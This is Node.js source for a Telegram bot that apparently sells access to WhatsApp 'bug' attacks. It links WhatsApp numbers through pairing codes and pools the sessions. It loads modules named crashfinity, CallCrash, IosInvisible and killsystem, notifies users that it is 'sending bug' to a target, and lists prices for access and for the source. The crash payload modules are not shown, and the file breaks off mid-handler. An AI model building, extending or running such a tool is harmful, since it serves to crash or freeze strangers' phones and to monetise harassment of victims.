process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const { default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');

console.clear();

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) fs.mkdirSync(LoveDir);

const { spawn } = require('child_process');
const activeBots = {};
const startTime = Date.now();
const LoveLogo = config.logo;
const waSessions = {};
const unauthorized = Buffer.from('8J+aqyBZb3UgYXJlIG5vdCBhdXRob3JpemVkIHRvIHVzZSB0aGlzIGNvbW1hbmQu', 'base64').toString();

// ════════════════════════ STYLISH TEXT GENERATOR ════════════════════════
const stylishFonts = {
    fancy: (text) => {
        const map = {
            'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ',
            'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ',
            'q': 'ǫ', 'r': 'ʀ', 's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x',
            'y': 'ʏ', 'z': 'ᴢ',
            'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ',
            'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ',
            'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x',
            'Y': 'ʏ', 'Z': 'ᴢ'
        };
        return text.split('').map(c => map[c] || c).join('');
    },
    bold: (text) => {
        const map = {
            'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶','j':'𝗷',
            'k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁',
            'u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
            'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜','J':'𝗝',
            'K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧',
            'U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭'
        };
        return text.split('').map(c => map[c] || c).join('');
    },
    script: (text) => {
        const map = {
            'a':'𝒶','b':'𝒷','c':'𝒸','d':'𝒹','e':'ℯ','f':'𝒻','g':'ℊ','h':'𝒽','i':'𝒾','j':'𝒿',
            'k':'𝓀','l':'𝓁','m':'𝓂','n':'𝓃','o':'ℴ','p':'𝓅','q':'𝓆','r':'𝓇','s':'𝓈','t':'𝓉',
            'u':'𝓊','v':'𝓋','w':'𝓌','x':'𝓍','y':'𝓎','z':'𝓏',
            'A':'𝒜','B':'ℬ','C':'𝒞','D':'𝒟','E':'ℰ','F':'ℱ','G':'𝒢','H':'ℋ','I':'ℐ','J':'𝒥',
            'K':'𝒦','L':'ℒ','M':'ℳ','N':'𝒩','O':'𝒪','P':'𝒫','Q':'𝒬','R':'ℛ','S':'𝒮','T':'𝒯',
            'U':'𝒰','V':'𝒱','W':'𝒲','X':'𝒳','Y':'𝒴','Z':'𝒵'
        };
        return text.split('').map(c => map[c] || c).join('');
    }
};

// ════════════════════════ DECORATION HELPERS ════════════════════════
const deco = {
    line: '━━━━━━━━━━━━━━━━━━━━━━━',
    double: '═'.repeat(25),
    star: '✦',
    diamond: '◈',
    arrow: '➻',
    bullet: '•',
    crown: '👑',
    fire: '🔥',
    sparkles: '✨',
    verified: '✅',
    lock: '🔒',
    warning: '⚠️',
    error: '❌',
    success: '✅',
    info: 'ℹ️',
    rocket: '🚀',
    ghost: '👻',
    devil: '😈',
    angel: '😇',
    money: '💰',
    star2: '⭐',
    zap: '⚡',
    heart: '💖',
    broken: '💔',
    cool: '😎',
    bot: '🤖',
    crystal: '💎'
};

function styleText(text, font = 'fancy') {
    if (stylishFonts[font]) return stylishFonts[font](text);
    return text;
}

// ════════════════════════ VERIFICATION SYSTEM ════════════════════════
const verifyDBPath = path.join(LoveDir, 'verified.json');
const pendingVerifyPath = path.join(LoveDir, 'pending.json');

function getVerifyDB() {
    if (!fs.existsSync(verifyDBPath)) return {};
    try {
        return JSON.parse(fs.readFileSync(verifyDBPath));
    } catch { return {}; }
}

function saveVerifyDB(data) {
    fs.writeFileSync(verifyDBPath, JSON.stringify(data, null, 2));
}

function getPendingDB() {
    if (!fs.existsSync(pendingVerifyPath)) return {};
    try {
        return JSON.parse(fs.readFileSync(pendingVerifyPath));
    } catch { return {}; }
}

function savePendingDB(data) {
    fs.writeFileSync(pendingVerifyPath, JSON.stringify(data, null, 2));
}

function isUserVerified(userId) {
    const db = getVerifyDB();
    return db[userId.toString()] === true;
}

function verifyUser(userId) {
    const db = getVerifyDB();
    db[userId.toString()] = true;
    saveVerifyDB(db);
    const pending = getPendingDB();
    delete pending[userId.toString()];
    savePendingDB(pending);
}

// ════════════════════════ ANIMATION FRAMES ════════════════════════
const animFrames = {
    loading: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
    dots: ['.', '..', '...', '....', '.....'],
    pulse: ['○', '◔', '◑', '◕', '●', '◕', '◑', '◔'],
    bounce: ['⠁', '⠂', '⠄', '⡀', '⢀', '⠠', '⠐', '⠈'],
    glitch: ['▓', '▒', '░', '▒', '▓']
};

function getAnimatedText(text, frameType = 'loading', index = 0) {
    const frames = animFrames[frameType] || animFrames.loading;
    return `${frames[index % frames.length]} ${text}`;
}

// ════════════════════════ WELCOME ANIMATION ════════════════════════
async function sendWelcomeAnimation(bot, chatId, name) {
    const frames = [
        `${deco.ghost} 𝖫𝗈𝖺𝖽𝗂𝗇𝗀 𝗌𝗒𝗌𝗍𝖾𝗆...`,
        `${deco.fire} 𝖨𝗇𝗂𝗍𝗂𝖺𝗅𝗂𝗓𝗂𝗇𝗀 𝗆𝗈𝖽𝗎𝗅𝖾𝗌...`,
        `${deco.zap} 𝖢𝗈𝗇𝗇𝖾𝖼𝗍𝗂𝗇𝗀 𝗍𝗈 𝗌𝖾𝗋𝗏𝖾𝗋...`,
        `${deco.sparkles} 𝖵𝖾𝗋𝗂𝖿𝗒𝗂𝗇𝗀 𝗎𝗌𝖾𝗋...`,
        `${deco.crown} 𝖶𝖾𝗅𝖼𝗈𝗆𝖾 𝖳𝗈 𝖳𝗁𝖾 𝖲𝗒𝗌𝗍𝖾𝗆!`
    ];
    
    let msg = await bot.sendMessage(chatId, `${deco.bot} 𝖯𝗅𝖾𝖺𝗌𝖾 𝗐𝖺𝗂𝗍...`);
    
    for (let i = 0; i < frames.length; i++) {
        await new Promise(r => setTimeout(r, 600));
        await bot.editMessageText(frames[i], {
            chat_id: chatId,
            message_id: msg.message_id
        }).catch(() => {});
    }
    
    await new Promise(r => setTimeout(r, 500));
    await bot.deleteMessage(chatId, msg.message_id).catch(() => {});
}

// ════════════════════════ VERIFICATION MESSAGE ════════════════════════
function getVerificationMessage(name) {
    const s = (text) => styleText(text, 'script');
    const f = (text) => styleText(text, 'fancy');
    const b = (text) => styleText(text, 'bold');
    
    return `
${deco.double}
${deco.crystal} ${s('WELCOME TO THE SYSTEM')} ${deco.crystal}
${deco.double}

${deco.angel} 𝖧𝖾𝗒 ${b(name)}!

${deco.warning} ${f('VERIFICATION REQUIRED')} ${deco.warning}

${deco.info} 𝖳𝗈 𝗎𝗌𝖾 𝗍𝗁𝗂𝗌 𝖻𝗈𝗍, 𝗒𝗈𝗎 𝗆𝗎𝗌𝗍 𝗃𝗈𝗂𝗇 𝗈𝗎𝗋 𝖼𝗈𝗆𝗆𝗎𝗇𝗂𝗍𝗂𝖾𝗌:

${deco.star} ${b('1. Telegram Channel')}
${deco.arrow} ${config.channel}

${deco.star} ${b('2. Telegram Group')}
${deco.arrow} ${config.group}

${deco.star} ${b('3. YouTube Channel')}
${deco.arrow} ${config.youtube || 'https://youtube.com/@yourchannel'}

${deco.star} ${b('4. WhatsApp Channel')}
${deco.arrow} ${config.whatsapp || 'https://whatsapp.com/channel/yourchannel'}

${deco.line}

${deco.rocket} ${f('AFTER JOINING ALL:')}
𝖢𝗅𝗂𝖼𝗄 𝗍𝗁𝖾 𝖻𝗎𝗍𝗍𝗈𝗇 𝖻𝖾𝗅𝗈𝗐 𝗍𝗈 𝗏𝖾𝗋𝗂𝖿𝗒!

${deco.line}
`;
}

// ════════════════════════ PREMIUM NOTIFICATION ════════════════════════
async function notifyPremiumAdded(bot, userId, addedBy) {
    const s = (text) => styleText(text, 'script');
    const f = (text) => styleText(text, 'fancy');
    const b = (text) => styleText(text, 'bold');
    
    const text = `
${deco.double}
${deco.crown} ${s('PREMIUM ACTIVATED')} ${deco.crown}
${deco.double}

${deco.sparkles} ${b('Congratulations!')}
${deco.angel} 𝖸𝗈𝗎𝗋 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝗁𝖺𝗌 𝖻𝖾𝖾𝗇 𝗎𝗉𝗀𝗋𝖺𝖽𝖾𝖽 𝗍𝗈 ${f('PREMIUM')}!

${deco.line}

${deco.star} ${b('Benefits Unlocked:')}
${deco.bullet} 𝖠𝗅𝗅 𝖡𝗎𝗀 𝖢𝗈𝗆𝗆𝖺𝗇𝖽𝗌
${deco.bullet} 𝖯𝗋𝗂𝗈𝗋𝗂𝗍𝗒 𝖲𝗎𝗉𝗉𝗈𝗋𝗍
${deco.bullet} 𝖥𝖺𝗌𝗍𝖾𝗋 𝖤𝗑𝖾𝖼𝗎𝗍𝗂𝗈𝗇
${deco.bullet} 𝖤𝗑𝖼𝗅𝗎𝗌𝗂𝗏𝖾 𝖥𝖾𝖺𝗍𝗎𝗋𝖾𝗌

${deco.line}

${deco.rocket} ${f('Enjoy Your Premium Access!')}
${deco.money} 𝖳𝗁𝖺𝗇𝗄 𝗒𝗈𝗎 𝖿𝗈𝗋 𝗌𝗎𝗉𝗉𝗈𝗋𝗍𝗂𝗇𝗀 𝗎𝗌!

${deco.double}
`;
    
    try {
        await bot.sendMessage(userId, text, { parse_mode: 'HTML' });
    } catch (e) {
        log('error', 'PREMIUM_NOTIFY', `Failed to notify user ${userId}`);
    }
}

async function notifyPremiumRemoved(bot, userId, removedBy) {
    const text = `
${deco.error} ${styleText('PREMIUM REMOVED', 'script')} ${deco.error}

${deco.broken} 𝖸𝗈𝗎𝗋 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝖺𝖼𝖼𝖾𝗌𝗌 𝗁𝖺𝗌 𝖻𝖾𝖾𝗇 𝗋𝖾𝗏𝗈𝗄𝖾𝖽.

${deco.info} 𝖢𝗈𝗇𝗍𝖺𝖼𝗍 𝖺𝖽𝗆𝗂𝗇 𝖿𝗈𝗋 𝗆𝗈𝗋𝖾 𝗂𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇.
`;
    
    try {
        await bot.sendMessage(userId, text, { parse_mode: 'HTML' });
    } catch (e) {
        log('error', 'PREMIUM_REMOVE', `Failed to notify user ${userId}`);
    }
}

// SY Loves Here 🤗❤️‍🩹
const SYLoves = `./SY/S7/`;
const CrashLogic = require(SYLoves + 'crashfinity');
const stickerLogic = require(SYLoves + 'StickerCrash');
const CallLogic = require(SYLoves + 'CallCrash');
const XLogic = require(SYLoves + 'Xdelay');
const IosLogic = require(SYLoves + 'IosInvisible');
const XgcLogic = require(SYLoves + 'Xgc');
const xbetainvisLogic = require(SYLoves + 'xbetainvis');
const testlogic = require(SYLoves + 'test');
// ADDED NEW MODULES
const crashjamLogic = require(SYLoves + 'crashjam');
const killsystemLogic = require(SYLoves + 'killsystem');
const gcFrzLogic = require(SYLoves + 'gcFrz');

const colors = {
    reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
    red: "\x1b[31m", magenta: "\x1b[35m", cyan: "\x1b[36m", yellow: "\x1b[33m"
};

function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days}d ${hours}h ${minutes}m`;
}

function log(type, user, message) {
    const time = new Date().toLocaleTimeString();
    const timestamp = `${colors.gray}[${time}]${colors.reset}`;
    let typeTag = "";
    if (type === 'info') typeTag = `${colors.blue}INFO${colors.reset}`;
    if (type === 'success') typeTag = `${colors.green}SUCCESS${colors.reset}`;
    if (type === 'error') typeTag = `${colors.red}ERROR${colors.reset}`;
    if (type === 'command') typeTag = `${colors.magenta}CMD${colors.reset}`;
    const userTag = user ? `${colors.cyan}${user}${colors.reset}` : "SYSTEM";
    console.log(`${timestamp} | ${typeTag} | ${userTag} | ${message}`);
}

const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');
    if (!fs.existsSync(dbPath)) return { tokens: [], premium: [], resellers: [] };
    try {
        const content = fs.readFileSync(dbPath);
        const parsed = JSON.parse(content);
        if (Array.isArray(parsed)) return { tokens: parsed, premium: [], resellers: [] };
        return {
            state: typeof parsed.state === 'number' ? parsed.state : 0,
            tokens: parsed.tokens || [],
            premium: parsed.premium || [],
            resellers: parsed.resellers || []
        };
    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);
        return { tokens: [], premium: [], resellers: [] };
    }
};

const saveDB = (data) => {
    try {
        fs.writeFileSync(path.join(LoveDir, 'data.json'), JSON.stringify(data, null, 2));
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};

function sendSYLove(bot, chatId) {
    const s = (text) => styleText(text, 'script');
    const f = (text) => styleText(text, 'fancy');
    
    bot.sendMessage(
        chatId,
        `${deco.error} ${s('ACCESS DENIED')} ${deco.error}\n\n` +
        `${deco.lock} ${f('You are not authorized to use this command.')}\n\n` +
        `${deco.money} ${s('PREMIUM REQUIRED')}\n\n` +
        `${deco.info} 𝖯𝗅𝖾𝖺𝗌𝖾 𝖼𝗈𝗇𝗍𝖺𝖼𝗍 𝗍𝗁𝖾 𝖽𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝗍𝗈 𝖻𝗎𝗒:\n` +
        `${config.S7}\n\n` +
        `${deco.line}\n` +
        `${deco.star2} ${f('PRICE LIST')}:\n` +
        `${deco.bullet} ${b('Permanent Access')}: 15$\n` +
        `${deco.bullet} ${b('Permanent Resell')}: 30$\n` +
        `${deco.bullet} ${b('Script (Source)')}: 100$`,
        { parse_mode: 'HTML' }
    );
}

function LoveGlobalState(userId) {
    const db = getDB();
    // State 0 = Free mode (but we changed to always require premium for commands)
    // State 1 = Premium only mode
    // Now we ALWAYS require premium for bug commands
    if (db.state === 0) {
        // Even in free mode, only premium can use commands
        if (
            userId.toString() === config.adminId.toString() ||
            db.resellers.includes(userId.toString()) ||
            db.premium.includes(userId.toString())
        ) {
            return true;
        }
        return false;
    }
    if (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    ) {
        return true;
    }
    return false;
}

// Check if user can view menu (everyone can view, but only premium can use)
function canViewMenu(userId) {
    return true; // Everyone can see menu
}

// Check if user can use commands (only premium)
function canUseCommands(userId) {
    const db = getDB();
    return (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    );
}

// --- GLOBAL SESSION POOL ---
function GetSessionForUser(userId, chatId) {
    let db = getDB();
    const isPremium = (
        userId.toString() === config.adminId.toString() ||
        db.resellers.includes(userId.toString()) ||
        db.premium.includes(userId.toString())
    );

    let eligibleSessions = [];

    if (isPremium) {
        Object.values(waSessions).forEach(sessions => {
            if (Array.isArray(sessions)) {
                sessions.forEach(s => eligibleSessions.push(s));
            }
        });
        if (eligibleSessions.length === 0) {
            return { error: '❌ No numbers connected in the system globally.' };
        }
        return eligibleSessions[Math.floor(Math.random() * eligibleSessions.length)];
    } else {
        if (!waSessions[chatId] || waSessions[chatId].length === 0) {
            return { error: '❌ No Number connected please use /reqpair to connect' };
        }
        return waSessions[chatId][Math.floor(Math.random() * waSessions[chatId].length)];
    }
}

// --- WhatsApp Connection Functions ---
async function StartLovingSY(chatId, number, S7) {
    const authPath = `./Love/auth/${chatId}/${number}`;
    const isNewLogin = !fs.existsSync(path.join(authPath, 'creds.json'));

    if (!fs.existsSync(authPath)) {
        fs.mkdirSync(authPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(authPath);

    const SYxS7 = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        browser: ['Mac OS', 'Safari', '10.15.7'],
        markOnlineOnConnect: true
    });

    if (!SYxS7.authState.creds.registered) {
        await delay(1500);
        try {
            const code = await SYxS7.requestPairingCode(number, `KASHMIRI`);
            S7.sendMessage(chatId, `╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮\n│➻ Nᴜᴍʙᴇʀ : ${number}\n│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : <code>${code?.match(/.{1,4}/g)?.join("-") || code}</code>\n╰───────────────────────╯`, { parse_mode: 'HTML' });
        } catch (err) {
            log('error', 'WhatsApp', `Error requesting code: ${err.message}`);
        }
    }

    SYxS7.ev.on('creds.update', saveCreds);

    SYxS7.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'connecting') {
            log('info', 'WhatsApp', `Connecting: ${number}`);
        }

        if (connection === "open") {
            log('success', 'WhatsApp', `Connected: ${number}`);
            if (!waSessions[chatId]) waSessions[chatId] = [];
            waSessions[chatId].push({ sock: SYxS7, num: number });
            if (isNewLogin) {
                await S7.sendMessage(chatId, `✅ <b>WhatsApp Connected!</b>\nNumber: ${number}.`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
        if (connection === "close") {
            if (waSessions[chatId]) {
                waSessions[chatId] = waSessions[chatId].filter(s => s.num !== number);
            }

            let reason = lastDisconnect?.error?.output?.statusCode;
            log('error', 'WhatsApp', `Connection closed for ${number}. Reason: ${reason}`);
            if (reason === DisconnectReason.restartRequired || reason === DisconnectReason.connectionLost) {
                log('info', 'WhatsApp', `Restarting/Reconnecting session for ${number}...`);
                StartLovingSY(chatId, number, S7);
            } else if (reason === DisconnectReason.loggedOut || reason === 401) {
                log('error', 'WhatsApp', `Session for ${number} is permanently LOGGED OUT.`);
                await S7.sendMessage(chatId, `❌ <b>WhatsApp Logged Out</b>\nNumber: ${number}\nSession has been terminated. Please use /reqpair again.`, { parse_mode: 'HTML' }).catch(() => {});
                const SYPaTH = `./Love/auth/${chatId}/${number}`;
                if (fs.existsSync(SYPaTH)) fs.rmSync(SYPaTH, { recursive: true, force: true });
            } else if (reason === DisconnectReason.timedOut) {
                log('error', 'WhatsApp', `Timed out for ${number}. Reconnecting...`);
                StartLovingSY(chatId, number, S7);
            } else {
                await S7.sendMessage(chatId, `⚠️ <b>Connection Closed</b>\nNumber: ${number}\nReason: ${reason}`, { parse_mode: 'HTML' }).catch(() => {});
            }
        }
    });
}

async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    StartLovingSY(chatId, number, S7);
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}

async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner;
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`,
                { parse_mode: 'HTML' }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    if (love.toString() === config.adminId.toString()) return 'Owner';
    if (db.resellers.includes(love.toString())) return 'Reseller';
    if (db.premium.includes(love.toString())) return 'Premium';
    return 'Free User';
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);
    const s = (text) => styleText(text, 'script');
    return `┌──────┤ ${s(config.bot)} ├──────┐\n│➻ Name: ${name}\n│➻ Status: ${status}\n│➻ Online: ${uptime}\n└──────────────────────┘`;
}

function BvgSYLoVe(cleanTarget) {
    return `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ \n┃ Tᴀʀɢᴇᴛ : ${cleanTarget}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
}

// ==================== START BOT ====================
function startSYloveBot(token) {
    try {
        const S7 = new SY(token, { polling: true });
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
            log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);
            if (err.message.includes('404') || err.message.includes('401') || err.message.includes('Unauthorized')) {
                await S7Naverdead(token, err.message);
            }
        });

        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) commands = [commands];
            S7.on('message', (msg) => {
                if (!msg.text) return;
                const cmd = msg.text.trim().split(' ')[0].slice(1);
                if (commands.includes(cmd)) {
                    try {
                        const name = msg.from.first_name || msg.from.username || "Unknown";
                        log('command', name, msg.text);
                        callback(msg);
                    } catch (err) {
                        log('error', 'COMMAND_EXEC', err.message);
                        S7.sendMessage(msg.chat.id, 'An internal error occurred.');
                    }
                }
            });
        }

        // ════════════════════════ VERIFICATION COMMAND ════════════════════════
        SYLoVe('verify', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const name = msg.from.first_name || msg.from.username || "User";
            
            if (isUserVerified(userId)) {
                return S7.sendMessage(chatId, `${deco.success} ${styleText('You are already verified!', 'fancy')}`, { parse_mode: 'HTML' });
            }
            
            // Check if user joined all required channels/groups
            // Note: Bot can't actually check if user joined YouTube/WhatsApp, so we trust them
            verifyUser(userId);
            
            await sendWelcomeAnimation(S7, chatId, name);
            
            const welcomeText = `
${deco.double}
${deco.crown} ${styleText('VERIFICATION SUCCESSFUL', 'script')} ${deco.crown}
${deco.double}

${deco.angel} 𝖶𝖾𝗅𝖼𝗈𝗆𝖾 ${styleText(name, 'bold')}!

${deco.sparkles} 𝖸𝗈𝗎 𝗁𝖺𝗏𝖾 𝗌𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒 𝗏𝖾𝗋𝗂𝖿𝗂𝖾𝖽 𝗒𝗈𝗎𝗋𝗌𝖾𝗅𝖿.

${deco.info} 𝖭𝗈𝗐 𝗒𝗈𝗎 𝖼𝖺𝗇 𝗎𝗌𝖾 𝗍𝗁𝖾 𝖻𝗈𝗍!

${deco.line}

${deco.lock} ${styleText('NOTE:', 'bold')}
${deco.bullet} 𝖡𝗎𝗀 𝖼𝗈𝗆𝗆𝖺𝗇𝖽𝗌 𝗋𝖾𝗊𝗎𝗂𝗋𝖾 𝗉𝗋𝖾𝗆𝗂𝗎𝗆 𝖺𝖼𝖼𝖾𝗌𝗌
${deco.bullet} 𝖢𝗈𝗇𝗍𝖺𝖼𝗍 𝖺𝖽𝗆𝗂𝗇 𝗍𝗈 𝖻𝗎𝗒 𝗉𝗋𝖾𝗆𝗂𝗎𝗆

${deco.double}
`;
            
            const menuButtons = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: `${deco.fire}  𝖡𝗎𝗀 𝖬𝖾𝗇𝗎`, callback_data: 'bug_menu' }, { text: `${deco.star}  𝖬𝗂𝗌𝖼 𝖬𝖾𝗇𝗎`, callback_data: 'misc_menu' }],
                        [{ text: `${deco.rocket}  𝖢𝗁𝖺𝗇𝗇𝖾𝗅 ↗`, url: `${config.channel}` }],
                        [{ text: `${deco.ghost}  𝖦𝗋𝗈𝗎𝗉 ↗`, url: `${config.group}` }]
                    ]
                }
            };
            
            S7.sendPhoto(chatId, LoveLogo, {
                caption: welcomeText,
                ...menuButtons
            }).catch(() => {
                S7.sendMessage(chatId, welcomeText, menuButtons);
            });
        });

        // ==================== COMMANDS ====================

        // --- Start / Menu ---
        SYLoVe(['start', 'menu'], async (msg) => {
            const chatId = msg.chat.id;
            const name = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
            const uptime = getRuntime();
            const userId = msg.from.id.toString();

            // Check verification first
            if (!isUserVerified(userId)) {
                const verifyText = getVerificationMessage(name);
                const verifyButtons = {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: `${deco.rocket} 𝖩𝗈𝗂𝗇 𝖢𝗁𝖺𝗇𝗇𝖾𝗅`, url: `${config.channel}` }],
                            [{ text: `${deco.ghost} 𝖩𝗈𝗂𝗇 𝖦𝗋𝗈𝗎𝗉`, url: `${config.group}` }],
                            [{ text: `${deco.fire} 𝖸𝗈𝗎𝖳𝗎𝖻𝖾`, url: `${config.youtube || 'https://youtube.com/@yourchannel'}` }],
                            [{ text: `${deco.zap} 𝖶𝗁𝖺𝗍𝗌𝖠𝗉𝗉`, url: `${config.whatsapp || 'https://whatsapp.com/channel/yourchannel'}` }],
                            [{ text: `${deco.verified} 𝖨 𝗁𝖺𝗏𝖾 𝗃𝗈𝗂𝗇𝖾𝖽 𝖺𝗅𝗅`, callback_data: 'verify_me' }]
                        ]
                    }
                };
                
                return S7.sendPhoto(chatId, LoveLogo, {
                    caption: verifyText,
                    ...verifyButtons
                }).catch(() => {
                    S7.sendMessage(chatId, verifyText, verifyButtons);
                });
            }

            const userFile = path.join(LoveDir, 'user.json');
            let users = [];
            if (fs.existsSync(userFile)) users = JSON.parse(fs.readFileSync(userFile));

            const userExists = users.find(u => u.id === chatId);
            if (!userExists) {
                users.push({ id: chatId, name: name, date: new Date().toLocaleString() });
                fs.writeFileSync(userFile, JSON.stringify(users, null, 2));
            }
            const love = msg.from.id.toString();

            const captionText = MainSYLoVe(name, uptime, love) + `
┌──────┤ ${styleText('Press Button Menu', 'fancy')} ├──────┐
└────────────────────────┘`;

            const menuButtons = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: `${deco.fire}  𝖡𝗎𝗀 𝖬𝖾𝗇𝗎`, callback_data: 'bug_menu' }, { text: `${deco.star}  𝖬𝗂𝗌𝖼 𝖬𝖾𝗇𝗎`, callback_data: 'misc_menu' }],
                        [{ text: `${deco.rocket}  𝖢𝗁𝖺𝗇𝗇𝖾𝗅 ↗`, url: `${config.channel}` }],
                        [{ text: `${deco.ghost}  𝖦𝗋𝗈𝗎𝗉 ↗`, url: `${config.group}` }]
                    ]
                }
            };

            S7.sendPhoto(chatId, LoveLogo, {
                caption: captionText,
                ...menuButtons
            }).catch(() => {
                S7.sendMessage(chatId, captionText, menuButtons);
            });
        });

        // ==================== CALLBACK QUERY HANDLER ====================
        S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
            const uptime = getRuntime();
            const userId = query.from.id.toString();

            // Handle verification callback
            if (data === 'verify_me') {
                if (isUserVerified(userId)) {
                    await S7.answerCallbackQuery(query.id, { text: '✅ Already verified!', show_alert: true });
                    return;
                }
                
                verifyUser(userId);
